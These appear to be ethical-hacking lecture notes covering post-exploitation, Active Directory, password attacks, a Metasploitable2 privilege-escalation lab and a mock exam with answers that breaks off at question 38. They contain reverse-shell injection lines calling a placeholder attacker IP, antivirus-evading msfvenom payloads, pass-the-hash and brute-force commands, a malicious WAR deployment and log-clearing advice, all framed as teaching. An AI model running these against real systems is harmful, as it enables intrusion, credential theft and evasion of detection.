# Week 12 — Post Exploitation, Windows & Active Directory

**Module:** UOP M31880 Ethical Hacking
**Lecturer:** Tobi Fajana

---

## Overview

Week 12 covers advanced post-exploitation techniques, Windows Active Directory exploitation, password attack methodologies, and comprehensive exam preparation. This final week consolidates offensive security skills with real-world enterprise environment attacks.

**Topics Covered:**
- Post Exploitation Techniques
- Windows Active Directory Architecture and Exploitation
- Password Attacks (Online, Offline, Hash Cracking)
- Privilege Escalation Methods
- Practice Mock Exam (45 Questions)

---

## Lecture Content

### Post Exploitation Fundamentals

**Key Phases:**
1. **Planning**
   - Determine required tools and resources
   - Build knowledge base of target environment
   - Create realistic timeline
   - Identify specialization requirements
   - Plan for contingencies (what could go wrong)

2. **Research**
   - OSINT is extremely important for post-exploitation success
   - Gather information about network architecture
   - Identify high-value targets
   - Map user behaviors and permissions

3. **Execution**
   - Maintain operational security
   - Document findings
   - Avoid detection
   - Clean up artifacts

---

### Privilege Escalation Techniques

**Common Privilege Escalation Vectors:**

1. **Kernel Exploits**
   - Outdated kernel versions
   - Check with: `uname -a`
   - Search exploits: `searchsploit kernel version`

2. **Installed Software**
   - Vulnerable applications with elevated privileges
   - Third-party software with known CVEs

3. **Weak/Reused/Plaintext Passwords**
   - Configuration files containing credentials
   - Bash history files
   - Database credentials in web config files

4. **Inside Service Exploitation**
   - Services running with elevated privileges
   - Exploitable service configurations

5. **SUID Misconfiguration**
   - Files with SUID bit set running as root
   - Find with: `find / -perm -u=s 2>/dev/null`
   - Reference: [GTFOBins](https://gtfobins.github.io)

6. **Sudo/Admin Rights Abuse**
   - Check with: `sudo -l`
   - Exploit allowed commands for privilege escalation

7. **Bad PATH Configuration**
   - PATH hijacking attacks
   - Placing malicious binaries in PATH

8. **Cronjobs**
   - Scripts running with elevated privileges
   - Writable cronjob scripts

9. **Unmounted Filesystems**
   - Additional partitions with sensitive data
   - Check with: `cat /etc/fstab`

---

### Better Shells

**Shell Upgrades:**
- **Meterpreter**: Feature-rich post-exploitation shell
- **Reverse Shell**: Callback shells from target to attacker
- **GUI Access**: VNC, RDP for graphical interaction

**Escaping Restricted Shells:**
```bash
sh -r          # Restricted sh
bash -r        # Restricted bash
```

**Interactive Shell Upgrade:**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background shell: Ctrl+Z
stty raw -echo; fg
```

---

### Enumeration Scripts

**Automated Enumeration Tools:**

| Tool | Platform | Purpose |
|------|----------|---------|
| **LinPEAS** | Linux | Privilege escalation enumeration |
| **WinPEAS** | Windows | Privilege escalation enumeration |
| **LinEnum** | Linux | System enumeration |
| **unix-privesc-check** | Linux/Unix | Privilege escalation checks |
| **linprivchecker** | Linux | Quick privilege checks |
| **Meterpreter** | Multi-platform | Built-in enumeration modules |

**Warning:**
- Enumeration scripts are noisy
- Easy to detect by security monitoring
- Use with caution in production environments
- Prefer manual enumeration when stealth is required

---

### Bypassing Antivirus

**Strategies:**

1. **Use Less Noisy Tools**
   - Avoid common malware signatures
   - Use living-off-the-land binaries (LOLBins)

2. **MSFvenom Encoded Payloads**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp \
     LHOST=<attacker_ip> LPORT=5555 \
     -f exe -e x86/shikata_ga_nai -i 9 \
     -o meterpreter_encoded.exe
   ```

3. **Embed in Legitimate Files**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp \
     LHOST=<attacker_ip> LPORT=5555 \
     -f exe -x calc.exe -o bad_calc.exe
   ```

4. **Encryption and Obfuscation**
   - Encrypt payloads
   - Obfuscate malware code
   - Use polymorphic techniques

---

### Maintaining Persistence

**Persistence Techniques:**

1. **User Account Manipulation**
   - Create new accounts
   - Compromise existing accounts
   - Add accounts to privileged groups

2. **Backdoor Payloads**
   - Deploy secondary payloads
   - Multiple callback methods

3. **Rootkits**
   - Kernel-level persistence
   - Difficult to detect and remove

4. **Autorun Mechanisms**
   - **Linux:** `.bashrc`, `.bash_profile`, cron jobs
   - **Windows:** Startup folder, Registry Run keys

5. **Metasploit Persistence Modules**
   ```bash
   use exploit/windows/local/persistence
   use exploit/windows/local/registry_persistence
   ```

6. **Registry Keys (Windows)**
   - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
   - HKCU\Software\Microsoft\Windows\CurrentVersion\Run

7. **Application Backdoors**
   - Modify legitimate applications
   - Inject malicious code into trusted binaries

---

### Pivoting

**Network Pivoting Techniques:**

1. **Network Information Retrieval**
   - Map internal network topology
   - Identify additional targets
   - Discover network segments

2. **Port Forwarding/Tunnelling**
   - Forward ports through compromised host
   - Access internal services

3. **SSH Tunnelling**
   ```bash
   # Local port forwarding
   ssh -L local_port:remote_host:remote_port user@ssh_server

   # Remote port forwarding
   ssh -R remote_port:local_host:local_port user@ssh_server
   ```

4. **Bypass Firewalls**
   - Tunnel through allowed protocols
   - Use compromised host as proxy

5. **Access Other Networks**
   - Leverage dual-homed systems
   - Pivot to isolated network segments

---

### Covering Tracks

**Operational Security:**

**Pre-Attack:**
- Use encrypted scanners
- Hide IP address (VPN, Tor, proxies)
- Plan cleanup procedures

**During Attack:**
- Minimize logging
- Disable audit mechanisms (carefully)
- Use timestomping

**Post-Attack:**
- Remove uploaded files
- Clear command history
- Restore modified configurations
- Remove created user accounts
- Clear log entries
- Restore file timestamps

---

## Active Directory

### Overview

**Active Directory (AD)** is Microsoft's hierarchical directory service for Windows domain networks.

**Purpose:**
- Centralized network management
- Security management and authentication
- Policy enforcement
- Resource organization

**Stores:**
- User accounts, passwords, and password hashes
- Computer accounts
- Peripherals (printers, scanners)
- File shares (SMB)
- Security groups
- Organizational units (OUs)

---

### Active Directory Services

| Service | Purpose |
|---------|---------|
| **Active Directory Domain Services (AD DS)** | Core directory services |
| **Lightweight Directory Services** | LDAP services without full AD |
| **LDAP** | Lightweight Directory Access Protocol |
| **Certificate Services** | PKI and certificate management |
| **AD Federation Services (ADFS)** | Single sign-on across organizations |
| **Rights Management Services** | Information protection |

---

### Security Identifiers (SID)

**Security Identifier (SID):** Unique value identifying security principals (users, groups, computers)

**Format:** `S-1-5-21-<domain>-<RID>`

**Common RIDs:**
- **500:** Administrator account
- **501:** Guest account
- **512:** Domain Admins group
- **513:** Domain Users group

**Example:**
```
S-1-5-21-3623811015-3361044348-30300820-1013
```

---

### Domain Services Structure

**Hierarchy:**

1. **Domains**
   - Group of network objects (users, computers, devices)
   - Share common directory database
   - Managed by Domain Controllers

2. **Trees**
   - Collection of domains
   - Share contiguous namespace
   - Parent-child trust relationships

3. **Forests**
   - Collection of trees
   - Share common:
     - Schema
     - Configuration
     - Global Catalog
   - Top-level security boundary

4. **Organizational Units (OUs)**
   - Containers for organizing objects
   - Used for delegating administrative rights
   - Apply Group Policy Objects (GPOs)

---

### Domain Controllers

**Domain Controller (DC):** Windows Server with Active Directory Domain Services role installed

**Roles:**

1. **Global Catalog Server**
   - Contains partial information about every object in the forest
   - Enables forest-wide searches
   - Required for user logon

2. **Operation Masters (FSMO Roles):**

   **Forest-Level:**
   - **Schema Master:** Controls schema modifications (one per forest)
   - **Domain Naming Master:** Controls domain addition/removal (one per forest)

   **Domain-Level:**
   - **PDC Emulator:** Primary Domain Controller emulator, time synchronization, password changes
   - **Infrastructure Master:** Updates cross-domain group memberships
   - **RID Master:** Allocates Relative Identifier (RID) pools to DCs

---

### Trust Relationships

**Trust Relationships:** Allow pass-through authentication between domains

**Types:**
- **One-way Trust:** Domain A trusts Domain B (not reciprocal)
- **Two-way Trust:** Mutual trust between domains
- **Transitive Trust:** Trust extends beyond two domains
- **Non-transitive Trust:** Limited to two specific domains

**Purpose:**
- Enable resource sharing across domains
- Allow users to access resources in trusted domains
- Simplify administration in multi-domain environments

---

## Password Attacks

### Attack Types

**1. Online Attacks**
- Real-time authentication attempts
- Slow and noisy
- Risk of account lockout
- Easily logged and detected

**2. Offline Attacks**
- Hash cracking on attacker machine
- Fast (no network delay)
- No account lockout risk
- Requires hash acquisition first

**3. Passive Attacks**
- Default/common passwords
- No active authentication attempts
- Credential sniffing

**4. Social Engineering**
- Phishing
- Pretexting
- Credential harvesting

---

### Attack Techniques

#### Password Guessing

**Characteristics:**
- Direct credential injection
- Easily detected
- Very slow
- Bandwidth issues
- Can trigger account lockouts

**Example Tools:**
- Manual login attempts
- Browser-based form attacks

---

#### Sniffing

**Method:**
- Capture network traffic
- Extract credentials (may be plaintext)

**Requirements:**
- Network access (same subnet or MITM position)
- Unencrypted protocols (HTTP, FTP, Telnet)

**Tools:**
- Wireshark
- tcpdump
- Responder (LLMNR/NBT-NS poisoning)

---

#### Malware-Based Attacks

**Techniques:**
1. **Credential Grabbers**
   - Keyloggers
   - Memory dumping
   - Browser credential theft

2. **Delivery Methods**
   - Drive-by download
   - USB/CD autorun
   - Email attachments

3. **Man-in-Browser**
   - Browser injection
   - Form grabbing
   - Session hijacking

---

#### Brute Force Attacks

**Dictionary/Wordlist Attacks:**
- Use common password lists
- Common wordlist location: `/usr/share/wordlists/`
- Examples: `rockyou.txt`, `fasttrack.txt`

**Key-space Brute Force:**
- Try all possible character combinations
- Computationally expensive
- Effective for short passwords

---

### Windows Password Hashing

#### SAM File

**Security Account Manager (SAM):**
- Location: `C:\Windows\System32\config\SAM`
- Stores local user account hashes
- Encrypted with SYSKEY
- Locked while Windows is running

**Hash Format:**
```
Username:UserID:LM_hash:NTLM_hash:::
```

**Example:**
```
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::
```

**User IDs:**
- **500:** Administrator account
- **501:** Guest account

---

#### LM Hash (Legacy)

**LM Hash Weaknesses:**
1. Password split into two 7-character chunks
2. Padded to 14 characters total
3. Converted to uppercase (case-insensitive)
4. Each half hashed independently
5. Known suffix if password < 14 characters
6. No salt used

**Empty LM Hash:**
```
AAD3B435B51404EEAAD3B435B51404EE
```

**Security Impact:**
- Extremely weak
- Easy to crack
- Should be disabled on modern systems

---

#### NTLM Hash

**Characteristics:**
- MD4 hash of UTF-16-LE password
- Case-sensitive
- No salt (same password = same hash)
- Static between sessions

**Empty NTLM Hash:**
```
31D6CFE0D16AE931B73C59D7E0C089C0
```

---

### Hash Extraction Tools

**1. pwdump / fgdump**
- DLL injection into LSASS process
- Dumps SAM database hashes
- Requires administrative privileges

**2. Windows Credential Editor (WCE)**
- Extracts NTLM credentials from memory
- Can perform pass-the-hash attacks

**3. Mimikatz**
- Extract plaintext passwords
- Pass-the-hash
- Pass-the-ticket
- Golden/Silver ticket attacks

---

### Pass the Hash

**Concept:**
- Authenticate using NTLM hash directly
- No need to crack the password
- Exploits lack of salt in NTLM

**Why It Works:**
- NTLM hash is static
- Same hash used for every authentication
- No session-specific salting

**Tools:**
- pth-winexe
- Metasploit psexec modules
- CrackMapExec
- Mimikatz

**Example:**
```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.100 cmd
```

---

### Password Profiling and Mutation

**John the Ripper Mutation Rules:**

Create custom wordlists based on target information:
- Company name variations
- Location names
- Common substitutions (a→@, e→3, i→1, o→0, s→$)
- Append numbers/years
- Capitalization variations

**Example Rules:**
```
# Append years
$2 $0 $2 $3

# Capitalize first letter
c

# Replace characters
sa@ so0 se3

# Combinations
csa@$2023
```

---

### Online Attack Tools

**Warning:** Use as last resort due to:
- Account lockout risk
- Alert generation
- Slow speed
- High detection probability

**Tools:**

**1. Hydra**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

**2. Medusa**
```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
```

**3. Ncrack**
```bash
ncrack -p ssh -u admin -P passwords.txt 192.168.1.100
```

---

### Hash Cracking

**1. Hash Identification**
```bash
hash-identifier
hashid <hash>
```

**2. Rainbow Tables**
- Precomputed hash chains
- Trade space for time
- Ineffective against salted hashes

**Tools:**
- RainbowCrack
- Ophcrack (for LM/NTLM)

**3. Parallel/Distributed Cracking**

**John the Ripper:**
```bash
# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Brute force
john --incremental hashes.txt

# Show cracked passwords
john --show hashes.txt
```

**Hashcat:**
```bash
# NTLM hash cracking
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# MD5 hash cracking
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# GPU-accelerated cracking
hashcat -m 1000 -a 0 -d 1 hashes.txt wordlist.txt
```

**Common Hash Modes:**
- 0 = MD5
- 100 = SHA1
- 1000 = NTLM
- 1400 = SHA256
- 1800 = SHA512
- 3200 = bcrypt

---

### Countermeasures

**1. Password Salting**

**Concept:**
```
hashvalue = Hash(Salt + password)
```

**Benefits:**
- Different hash for same password
- Defeats rainbow tables
- Must crack each hash individually

**Implementation:**
```
hashvalue = Hash(Hash(Hash(Salt + password)))  # Multiple rounds
```

**2. PBKDF2 (Password-Based Key Derivation Function 2)**
- Intentionally slow hashing
- Configurable iteration count
- Resistant to brute force

**3. Disable LM Hashing**
- Modern Windows versions
- Group Policy setting
- Only use NTLM or better

**4. Password Policies**

**Technical Controls:**
- **Minimum Length:** 12+ characters
- **Complexity Requirements:**
  - Uppercase letters
  - Lowercase letters
  - Numbers
  - Special characters
- **Password History:** Prevent reuse of last 24 passwords
- **Maximum Age:** Force periodic changes (90 days)
- **Account Lockout:** 5 failed attempts, 30-minute lockout

**Administrative Policies:**
- No password sharing
- Secure password storage (password managers)
- Multi-factor authentication (MFA)
- Privileged account management
- Regular security awareness training

---

## Lab: Privilege Escalation on Metasploitable2

### Lab Setup

**Target:** Metasploitable2 VM (192.168.1.23)
**Attacker:** Kali Linux
**Objective:** Escalate from www-data to root

---

### Task 1: Initial Access

**Objective:** Gain initial shell access via command injection on DVWA

**Steps:**

1. **Access DVWA**
   ```
   http://192.168.1.23/dvwa
   ```

2. **Navigate to Command Injection**
   - Set security level to Low
   - Access Command Injection module

3. **Test Command Injection**
   ```bash
   127.0.0.1; whoami
   127.0.0.1; id
   ```

4. **Setup Reverse Shell Listener**
   ```bash
   nc -nlvp 4444
   ```

5. **Execute Reverse Shell**
   ```bash
   # In DVWA command injection
   127.0.0.1; nc -e /bin/bash <ATTACKER_IP> 4444

   # Or using bash
   127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
   ```

6. **Upgrade Shell**
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   # Ctrl+Z
   stty raw -echo; fg
   ```

**Result:** Shell as `www-data` user

---

### Task 2: Enumeration (www-data to msfadmin/root)

**Objective:** Enumerate system for privilege escalation vectors

**Finding Files:**

1. **Search for SQL Files**
   ```bash
   find /var -name "*.sql" 2>/dev/null
   ```

2. **Search for passwd Files**
   ```bash
   find / -name passwd 2>/dev/null
   ```

3. **Search for Passwords in Files**
   ```bash
   grep -Rnw /var/www -e "password" 2>/dev/null
   ```

**Known Locations:**

1. **Web Root:** `/var/www`
   - Configuration files
   - Database credentials

2. **SSH Keys:** `~/.ssh`
   - Private keys
   - Authorized_keys

3. **WordPress Config:** `/var/www/wordpress/wp-config.php`
   ```bash
   cat /var/www/wordpress/wp-config.php | grep -i password
   ```

4. **DVWA Config:** `/var/www/dvwa/config/config.inc.php`
   ```bash
   cat /var/www/dvwa/config/config.inc.php
   ```

---

### Task 3A: Find SSH Password and Login

**Methods:**

**Method 1: Configuration Files**
```bash
# Check web configs
cat /var/www/dvwa/config/config.inc.php
# Output shows: username=root, password=root

# Try SSH
ssh msfadmin@192.168.1.23
# Password: msfadmin
```

**Method 2: Metasploit SSH Login**
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.23
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

**Method 3: Predictable PRNG SSH Keys**
- Metasploitable2 uses weak SSH keys from Debian OpenSSL vulnerability
- Downloadable key database available

**Method 4: su Command**
```bash
# From www-data shell
su msfadmin
Password: msfadmin
```

**Result:** Access as `msfadmin` user

---

### Task 4: msfadmin to root via sudo

**Steps:**

1. **Check sudo Privileges**
   ```bash
   sudo -l
   ```

   **Output:**
   ```
   User msfadmin may run the following commands on this host:
       (ALL) NOPASSWD: ALL
   ```

2. **Escalate to root**
   ```bash
   sudo su
   ```

   **Or:**
   ```bash
   sudo /bin/bash
   ```

3. **Verify**
   ```bash
   id
   # uid=0(root) gid=0(root) groups=0(root)

   whoami
   # root
   ```

**Result:** Root access achieved

---

### Task 5: SUID Exploitation

**Objective:** Escalate privileges using SUID binaries

**Steps:**

1. **Find SUID Binaries**
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Analyze nmap Binary**
   ```bash
   ls -la /usr/bin/nmap
   # -rwsr-xr-x 1 root root ... /usr/bin/nmap

   strings /usr/bin/nmap | grep -i version
   ```

3. **Check nmap Version**
   ```bash
   nmap --version
   # Nmap version 4.53 (old version with interactive mode)
   ```

4. **Exploit nmap Interactive Mode**
   ```bash
   nmap --interactive
   nmap> !sh
   # Spawns root shell
   ```

5. **Verify Root Access**
   ```bash
   whoami
   # root
   id
   # uid=0(root) gid=0(root)
   ```

**Reference:** [GTFOBins - nmap](https://gtfobins.github.io/gtfobins/nmap/)

---

### Additional: Kernel Exploit

**Steps:**

1. **Check Kernel Version**
   ```bash
   uname -a
   # Linux metasploitable 2.6.24-16-server
   ```

2. **Search for Exploits**
   ```bash
   searchsploit kernel 2.6.24
   searchsploit linux kernel 2.6
   ```

3. **Compile and Execute Exploit**
   ```bash
   # Transfer exploit to target
   # Compile if needed
   gcc exploit.c -o exploit

   # Execute
   ./exploit
   ```

---

### Additional: Tomcat Exploitation

**Target:** Tomcat Manager on port 8180

**Steps:**

1. **Scan for Tomcat**
   ```bash
   nmap -p 8180 -sV 192.168.1.23
   ```

2. **Brute Force Tomcat Credentials**
   ```bash
   msfconsole
   use auxiliary/scanner/http/tomcat_mgr_login
   set RHOSTS 192.168.1.23
   set RPORT 8180
   run
   ```

   **Result:** Credentials found: `tomcat:tomcat`

3. **Deploy Malicious WAR File**
   ```bash
   use exploit/multi/http/tomcat_mgr_deploy
   set RHOSTS 192.168.1.23
   set RPORT 8180
   set HttpUsername tomcat
   set HttpPassword tomcat
   set LHOST <ATTACKER_IP>
   set PAYLOAD java/meterpreter/reverse_tcp
   exploit
   ```

4. **Get Meterpreter Session**
   ```bash
   sessions -i 1
   getuid
   # Server username: tomcat55
   ```

**Result:** Remote code execution as tomcat55 user

---

## Practice Mock Exam

### Exam Information

**Total Questions:** 45
**Coverage:** All weeks (1-12) of UOP M31880 Ethical Hacking
**Format:** Multiple choice, multiple select, matching, scenario-based

---

### Questions and Answers

**Q1: Which of the following is NOT a contributing factor to security vulnerabilities?**

A) Poor software design
B) Lack of security awareness
C) Honeypots
D) Outdated software

**Answer:** C) Honeypots
**Explanation:** Honeypots are defensive security tools used to detect and analyze attacks, not contributing factors to vulnerabilities.

---

**Q2: In a stack buffer overflow attack, what does the attacker typically attempt to overwrite?**

A) Heap memory
B) CPU registers
C) Instruction Pointer (IP/EIP/RIP)
D) Kernel memory

**Answer:** C) Instruction Pointer (IP/EIP/RIP)
**Explanation:** Stack buffer overflows aim to overwrite the return address (instruction pointer) to redirect program execution to malicious code.

---

**Q3: You need to set permissions on a file called "PasswordChecker" so that it executes with the owner's privileges and has full permissions for everyone. Which commands accomplish this?**

A) chmod 6777 PasswordChecker
B) chmod 777 PasswordChecker && chmod ug+s PasswordChecker
C) chmod 4755 PasswordChecker
D) Both A and B

**Answer:** D) Both A and B
**Explanation:**
- chmod 6777 sets SUID (4000) + SGID (2000) + full permissions (777) = 6777
- chmod 777 + chmod ug+s achieves the same result in two steps

---

**Q4: Which tools are commonly used for offline hash cracking?**

A) Hydra
B) John the Ripper
C) Hashcat
D) Medusa

**Answer:** B) John the Ripper and C) Hashcat
**Explanation:** John and Hashcat are offline hash cracking tools. Hydra and Medusa are online password attack tools.

---

**Q5: Match the shell/payload types with their definitions:**

1. Bind Shell
2. Reverse Shell
3. Web Shell
4. Meterpreter

A) Victim connects back to attacker
B) Attacker connects to victim's listening port
C) Web-based command interface
D) Advanced post-exploitation payload

**Answer:**
- 1-B (Bind Shell: Attacker connects to victim)
- 2-A (Reverse Shell: Victim connects to attacker)
- 3-C (Web Shell: Web interface for commands)
- 4-D (Meterpreter: Advanced Metasploit payload)

---

**Q6: In a Meterpreter session, which command drops you into a local shell on the target system?**

A) bash
B) shell
C) cmd
D) execute

**Answer:** B) shell
**Explanation:** The `shell` command in Meterpreter spawns a command shell on the target system.

---

**Q7: Which wget command performs SQL injection to extract all fields from the users table?**

A) `wget http://site.com/page?id=1 UNION SELECT * FROM users`
B) `wget "http://site.com/page?id=1' UNION SELECT * FROM users--"`
C) `wget http://site.com/page?id=1' AND 1=1`
D) `wget "http://site.com/page?fields=* FROM users"`

**Answer:** B) `wget "http://site.com/page?id=1' UNION SELECT * FROM users--"`
**Explanation:** Proper SQL injection syntax with quote, UNION, and comment to terminate the query.

---

**Q8: Which find command copies rockyou.txt to /tmp?**

A) `find /usr/share/wordlists -name rockyou.txt -copy /tmp`
B) `find /usr/share/wordlists -name rockyou.txt -exec cp {} /tmp \;`
C) `find -name rockyou.txt | cp /tmp`
D) `find /usr/share -name rockyou.txt > /tmp`

**Answer:** B) `find /usr/share/wordlists -name rockyou.txt -exec cp {} /tmp \;`
**Explanation:** The -exec flag executes commands on found files, with {} representing the found file.

---

**Q9: Analyze this netcat bind shell scenario:**

```
# Computer A
nc -nlvp 4444 -e /bin/bash

# Computer B
nc <IP_A> 4444
```

What is the result?

A) Computer A gets a shell on Computer B
B) Computer B gets a shell on Computer A
C) Bidirectional shell connection
D) Connection fails

**Answer:** B) Computer B gets a shell on Computer A
**Explanation:** Computer A hosts the bind shell (-e /bin/bash), Computer B connects and receives the bash shell.

---

**Q10: Which tool is used for passive footprinting?**

A) nmap
B) nikto
C) whois
D) sqlmap

**Answer:** C) whois
**Explanation:** whois performs passive reconnaissance by querying public domain registration databases. nmap and nikto are active scanning tools.

---

**Q11: Which is NOT an effective defense against buffer overflow attacks?**

A) Address Space Layout Randomization (ASLR)
B) Data Execution Prevention (DEP)
C) Stack canaries
D) Complex passwords

**Answer:** D) Complex passwords
**Explanation:** Buffer overflows are code-level vulnerabilities. Complex passwords don't prevent memory corruption attacks.

---

**Q12: Which commands can search for files in Linux? (Select all)**

A) find
B) locate
C) grep
D) search

**Answer:** A) find and B) locate
**Explanation:**
- find: Real-time file system search
- locate: Database-based file search
- grep: Content search (not filenames)
- search: Not a standard Linux command

---

**Q13: What is fuzzing in security testing?**

A) Encrypting network traffic
B) Sending malformed/random input to find vulnerabilities
C) Brute forcing passwords
D) Social engineering technique

**Answer:** B) Sending malformed/random input to find vulnerabilities
**Explanation:** Fuzzing involves providing invalid, unexpected, or random data as input to discover bugs and vulnerabilities.

---

**Q14: What does the command `echo $SHELL` output on a system using bash?**

A) /bin/sh
B) /bin/bash
C) bash
D) shell

**Answer:** B) /bin/bash
**Explanation:** $SHELL environment variable contains the full path to the user's default shell.

---

**Q15: An attacker exploits a voting system to change votes and deny it later. Which CIA principles are violated?**

A) Confidentiality
B) Integrity
C) Availability
D) Non-repudiation

**Answer:** B) Integrity and D) Non-repudiation
**Explanation:**
- Integrity: Votes are altered
- Non-repudiation: Attacker can deny the action

---

**Q16: Which command displays the manual page for a Linux command?**

A) help
B) man
C) info
D) docs

**Answer:** B) man
**Explanation:** `man <command>` displays the manual pages (documentation) for commands.

---

**Q17: Does salting always protect against rainbow table attacks?**

A) Yes, always
B) No, not if the salt is known and rainbow tables are generated with that salt
C) Yes, but only for MD5 hashes
D) No, salting has no effect on rainbow tables

**Answer:** B) No, not if the salt is known and rainbow tables are generated with that salt
**Explanation:** While salting significantly increases difficulty, if the salt is known and predictable, targeted rainbow tables can be generated.

---

**Q18: Which tools are NOT helpful for web directory scanning?**

A) gobuster
B) exiftool
C) dirb
D) nslookup

**Answer:** B) exiftool and D) nslookup
**Explanation:**
- exiftool: Metadata extraction from files
- nslookup: DNS queries
- gobuster/dirb: Directory brute forcing

---

**Q19: What does an MX DNS record specify?**

A) Mail servers for the domain
B) Name servers
C) IP addresses
D) Text records

**Answer:** A) Mail servers for the domain
**Explanation:** MX (Mail Exchange) records specify mail servers responsible for receiving email for a domain.

---

**Q20: Which command CANNOT retrieve emails remotely?**

A) fetchmail
B) find
C) POP3 client
D) IMAP client

**Answer:** B) find
**Explanation:** find is a local file system search tool, not an email retrieval protocol.

---

**Q21: Which Google dork searches for Excel spreadsheets with "RJ45" in the title?**

A) `filetype:xls title:RJ45`
B) `filetype:xls intitle:RJ45`
C) `ext:xls intitle:RJ45`
D) Both B and C

**Answer:** D) Both B and C
**Explanation:** Both `filetype:` and `ext:` work for file type specification, and `intitle:` searches page titles.

---

**Q22: Which techniques can be used to find buffer overflow vulnerabilities? (Select all)**

A) Source Code Analysis
B) Fuzzing
C) Reverse Engineering
D) Password cracking

**Answer:** A) Source Code Analysis, B) Fuzzing, C) Reverse Engineering
**Explanation:** All three are valid methods for discovering buffer overflows. Password cracking is unrelated.

---

**Q23: Which is NOT an Active Directory service?**

A) Active Directory Domain Services
B) Active Directory Certificate Services
C) Active Directory Federation Services
D) Active Directory Object Hierarchical Service

**Answer:** D) Active Directory Object Hierarchical Service
**Explanation:** This is not a real AD service. The others are legitimate AD components.

---

**Q24: What is the difference between forward and reverse DNS lookup?**

A) Forward: Domain to IP; Reverse: IP to Domain
B) Forward: IP to Domain; Reverse: Domain to IP
C) They are the same
D) Forward is faster than reverse

**Answer:** A) Forward: Domain to IP; Reverse: IP to Domain
**Explanation:**
- Forward DNS: Resolves domain name to IP address (A/AAAA record)
- Reverse DNS: Resolves IP address to domain name (PTR record)

---

**Q25: In MySQL, which database contains metadata about all tables and columns?**

A) mysql
B) information_schema
C) sys
D) performance_schema

**Answer:** B) information_schema
**Explanation:** information_schema contains metadata about databases, tables, columns, and privileges.

---

**Q26: What do these octal permissions represent?**

- 0755
- 0764

A) 0755: rwxr-xr-x; 0764: rwxrw-r--
B) 0755: rwxr-xr--; 0764: rwxrw-r--
C) 0755: rwxr-xr-x; 0764: rwx-w-r--
D) 0755: rwxrwxr-x; 0764: rwxr--r--

**Answer:** A) 0755: rwxr-xr-x; 0764: rwxrw-r--
**Explanation:**
- 0755: Owner (7=rwx), Group (5=r-x), Others (5=r-x)
- 0764: Owner (7=rwx), Group (6=rw-), Others (4=r--)

---

**Q27: When running gobuster, you see these HTTP status codes. What do they mean?**

- 404
- 500

A) 404: Not found; 500: Server error
B) 404: Found; 500: Not found
C) 404: Forbidden; 500: Unauthorized
D) 404: Server error; 500: Not found

**Answer:** A) 404: Not found; 500: Server error
**Explanation:**
- 404: Resource not found
- 500: Internal server error

---

**Q28: Analyze this Windows SID:**

```
S-1-5-21-3623811015-3361044348-30300820-501
```

What does the RID (501) indicate?

A) Administrator account
B) Guest account
C) Domain Admin group
D) Regular user account

**Answer:** B) Guest account
**Explanation:** RID 501 is the built-in Guest account. RID 500 is Administrator.

---

**Q29: Which practice does NOT help prevent data exposure?**

A) Input validation
B) Encryption at rest
C) Unauthenticated database backups
D) Encryption in transit

**Answer:** C) Unauthenticated database backups
**Explanation:** Unauthenticated backups expose data. All others are security best practices.

---

**Q30: What does `chmod 750 filename` do?**

A) Owner: rwx, Group: r-x, Others: ---
B) Owner: rwx, Group: r--, Others: ---
C) Owner: rwx, Group: can execute only, Others: ---
D) Both A and C

**Answer:** D) Both A and C
**Explanation:** 750 = Owner (7=rwx), Group (5=r-x = read and execute), Others (0=---)

---

**Q31: Which tool is NOT used for passive information gathering?**

A) whois
B) nslookup
C) nmap
D) Google dorking

**Answer:** C) nmap
**Explanation:** nmap actively scans targets. whois, nslookup, and Google dorking are passive techniques.

---

**Q32: Which SQL injection technique uses BENCHMARK function for time delays?**

A) Union-based SQLi
B) Error-based SQLi
C) Time-based blind SQLi
D) Boolean-based blind SQLi

**Answer:** C) Time-based blind SQLi
**Explanation:** BENCHMARK() causes deliberate delays to infer data based on response time.

**Example:**
```sql
' AND IF(1=1, BENCHMARK(5000000, MD5('test')), 0)--
```

---

**Q33: What does `objdump -d` do?**

A) Display file information
B) Display assembly disassembly
C) Dump object files
D) Debug binary

**Answer:** B) Display assembly disassembly
**Explanation:** objdump -d disassembles executable sections, showing assembly code.

---

**Q34: In buffer overflow exploitation, which functions might be called to spawn a shell?**

A) system()
B) CheckProcess()
C) execve()
D) Both A and C

**Answer:** D) Both A and C
**Explanation:**
- system(): Execute shell commands
- execve(): Execute programs
- CheckProcess() is not a standard function for shell spawning

---

**Q35: Which files are combined using the unshadow command?**

A) /etc/passwd and /etc/shadow
B) /etc/group and /etc/gshadow
C) /etc/passwd and /etc/security
D) /etc/shadow and /etc/security

**Answer:** A) /etc/passwd and /etc/shadow
**Explanation:** unshadow combines passwd and shadow files for password cracking with John the Ripper.

**Usage:**
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt
```

---

**Q36: A student account is added to the Domain Admins group. What type of privilege escalation is this?**

A) Horizontal privilege escalation
B) Vertical privilege escalation
C) Lateral movement
D) Privilege de-escalation

**Answer:** B) Vertical privilege escalation
**Explanation:** Moving from regular user to Domain Admin is vertical escalation (increasing privilege level).

---

**Q37: An attacker sends an email with a malicious PDF to steal credentials. What is this attack?**

A) Phishing
B) Pharming
C) Vishing
D) Smishing

**Answer:** A) Phishing
**Explanation:** Email-based social engineering with malicious attachment is phishing.

---

**Q38: What does `nmap -sV -p-` do?**

